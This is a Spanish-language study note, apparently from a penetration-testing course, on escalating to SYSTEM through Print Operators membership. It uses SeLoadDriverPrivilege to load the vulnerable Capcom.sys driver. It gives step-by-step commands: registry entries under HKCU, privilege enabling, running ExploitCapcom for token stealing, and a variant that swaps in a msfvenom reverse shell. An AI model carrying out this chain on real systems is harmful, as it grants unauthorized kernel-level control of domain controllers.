tags:
___
## 🧠 Concepto clave
El grupo **Print Operators** es uno de los grupos más privilegiados de Windows. Además de gestionar impresoras en Domain Controllers e iniciar sesión localmente en ellos, sus miembros reciben `SeLoadDriverPrivilege` — un privilegio que permite cargar drivers del kernel y que puede abusarse para ejecutar código como SYSTEM mediante el driver vulnerable `Capcom.sys`. 📄 [Print Operators — Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators)

| Privilegio | Qué es | Riesgo / Explotación |
|---|---|---|
| `SeLoadDriverPrivilege` | Permite cargar y descargar drivers de dispositivos en el kernel de Windows | Un atacante puede cargar un driver vulnerable como `Capcom.sys`, que permite a cualquier usuario ejecutar shellcode arbitrario con privilegios SYSTEM directamente en el kernel |

> ⚠️ **Limitación importante** — Desde Windows 10 versión 1803, `SeLoadDriverPrivilege` no es explotable de esta forma, ya que ya no es posible referenciar claves de registro bajo `HKEY_CURRENT_USER` para cargar drivers.

## 📌 Puntos importantes

### Bypass de UAC para ver SeLoadDriverPrivilege

En un contexto no elevado, `SeLoadDriverPrivilege` no aparecerá en `whoami /priv`. Para verlo y usarlo es necesario elevar la consola. Dos opciones:

- **Desde GUI** — Abrir una consola administrativa con las credenciales del usuario miembro de Print Operators.
- **Desde línea de comandos** — Usar alguno de los bypasses de UAC documentados en el repositorio 📄 [UACMe — hfiref0x](https://github.com/hfiref0x/UACME), que incluye una lista exhaustiva de técnicas de bypass ejecutables desde la línea de comandos.

Tras elevar, el privilegio aparecerá como `Disabled` — presente en el token pero no activo todavía. El binario `EnableSeLoadDriverPrivilege.exe` se encarga de activarlo.

### Capcom.sys — El driver vulnerable

`Capcom.sys` es un driver legítimo del fabricante de videojuegos Capcom que contiene una funcionalidad que **permite a cualquier usuario ejecutar shellcode con privilegios SYSTEM**. Al cargarlo en el kernel mediante `SeLoadDriverPrivilege`, se puede usar la herramienta `ExploitCapcom` para aprovecharse de esta funcionalidad y obtener una shell como SYSTEM. 📄 [Capcom.sys — FuzzySecurity](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

---

### Flujo de explotación — Manual

**Paso 1 — Compilar EnableSeLoadDriverPrivilege.cpp**

Descargar el código fuente 📄 [EnableSeLoadDriverPrivilege.cpp](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp), añadir los includes necesarios al inicio del archivo y compilarlo desde un Developer Command Prompt de Visual Studio 2019:
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

> [!tip] Compilar EnableSeLoadDriverPrivilege.cpp con cl.exe
> ```cmd
> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
> ```
> `cl` — Compilador de C/C++ de Visual Studio.
> `/DUNICODE /D_UNICODE` — Define las macros necesarias para compilación en modo Unicode.
> `EnableSeLoadDriverPrivilege.cpp` — Archivo fuente a compilar. Genera `EnableSeLoadDriverPrivilege.exe`.

**Paso 2 — Añadir referencia al driver en el registro**

El driver `Capcom.sys` se registra bajo `HKEY_CURRENT_USER` usando una ruta NT Object Path con la sintaxis `\??\`, que la Win32 API resuelve correctamente para localizar y cargar el driver:

> [!tip] Registrar Capcom.sys en el registro bajo HKCU
> ```cmd
> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
> ```
> `HKCU\System\CurrentControlSet\CAPCOM` — Clave de registro donde se define el driver. Al estar bajo HKCU, el usuario no necesita permisos de administrador para crearla.
> `/v ImagePath` — Valor que especifica la ruta al archivo del driver.
> `\??\C:\Tools\Capcom.sys` — Ruta en formato NT Object Path hacia el driver vulnerable.
> `/v Type /d 1` — Define el tipo de driver como kernel-mode driver.

**Paso 3 — Verificar que el driver NO está cargado todavía**

📄 [DriverView — NirSoft](http://www.nirsoft.net/utils/driverview.html) es una utilidad que lista todos los drivers cargados en el sistema:

> [!tip] Verificar que Capcom.sys no está cargado aún
> ```powershell
> .\DriverView.exe /stext drivers.txt
> cat drivers.txt | Select-String -pattern Capcom
> ```
> `/stext drivers.txt` — Exporta la lista de drivers cargados a un archivo de texto.
> `Select-String -pattern Capcom` — Filtra la salida buscando el nombre del driver. No debe aparecer nada en este paso.

**Paso 4 — Habilitar el privilegio y cargar el driver**

> [!tip] Ejecutar EnableSeLoadDriverPrivilege.exe para activar el privilegio y cargar el driver
> ```cmd
> EnableSeLoadDriverPrivilege.exe
> ```
> `EnableSeLoadDriverPrivilege.exe` — Activa `SeLoadDriverPrivilege` en el token actual y carga el driver Capcom.sys en el kernel mediante `NTLoadDriver`. Tras ejecutarlo, el privilegio aparecerá como `Enabled` en `whoami /priv`.

**Paso 5 — Verificar que Capcom.sys está ahora cargado**

> [!tip] Confirmar que Capcom.sys está cargado en el kernel
> ```powershell
> .\DriverView.exe /stext drivers.txt
> cat drivers.txt | Select-String -pattern Capcom
> ```
> Si el ataque va bien, la salida mostrará `Capcom.sys` con su ruta en `C:\Tools\Capcom.sys`.

**Paso 6 — Explotar Capcom.sys con ExploitCapcom** 📄 [ExploitCapcom — tandasat](https://github.com/tandasat/ExploitCapcom)

> [!tip] Lanzar ExploitCapcom para obtener una shell como SYSTEM
> ```powershell
> .\ExploitCapcom.exe
> ```
> `ExploitCapcom.exe` — Interactúa con el driver Capcom.sys para ejecutar shellcode en el kernel, realiza token stealing del proceso SYSTEM y lanza una shell `cmd.exe` con privilegios `NT AUTHORITY\SYSTEM`.

**Paso 6 alternativo — Sin acceso GUI (reverse shell)**

Si no se tiene acceso GUI al sistema, hay que modificar `ExploitCapcom.cpp` antes de compilarlo. En la línea 292, reemplazar el binario que lanza por un payload generado con msfvenom:
```c
// Original
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");

// Modificado
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Antes de ejecutar `ExploitCapcom.exe`, levantar el listener correspondiente en la máquina atacante para recibir la conexión.

---

### Flujo de explotación — Automatizado con EoPLoadDriver

📄 [EoPLoadDriver — TarlogicSecurity](https://github.com/TarlogicSecurity/EoPLoadDriver/) automatiza los pasos de habilitar el privilegio, crear la clave de registro y cargar el driver en un solo comando:

> [!tip] Automatizar la carga del driver con EoPLoadDriver
> ```cmd
> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
> ```
> `System\CurrentControlSet\Capcom` — Ruta relativa bajo `HKCU` donde se creará la clave de registro del driver.
> `c:\Tools\Capcom.sys` — Ruta local al archivo del driver vulnerable.

Tras esto, ejecutar `ExploitCapcom.exe` para obtener la shell SYSTEM.

---

### Limpieza post-explotación

> [!tip] Eliminar la clave de registro creada para el driver
> ```cmd
> reg delete HKCU\System\CurrentControlSet\Capcom
> ```
> `reg delete` — Elimina permanentemente la clave de registro especificada y todos sus valores.
> `HKCU\System\CurrentControlSet\Capcom` — Clave creada durante el ataque que referencia al driver malicioso. Eliminarla evita que el driver intente cargarse en futuros reinicios.

---

## 🔗 Relaciones / Contexto

El grupo **Print Operators** es otro ejemplo de grupo aparentemente inofensivo que en la práctica otorga un camino directo a SYSTEM en un Domain Controller. `SeLoadDriverPrivilege` es especialmente peligroso porque opera a nivel de kernel — una vez que se carga un driver malicioso, el sistema entero está comprometido. Este vector conecta directamente con la sección de privilegios del módulo: cualquier cuenta con `SeLoadDriverPrivilege` asignado, aunque no sea miembro de Print Operators, es un objetivo de alto valor. Durante un assessment, la membresía en este grupo debe marcarse siempre como hallazgo crítico.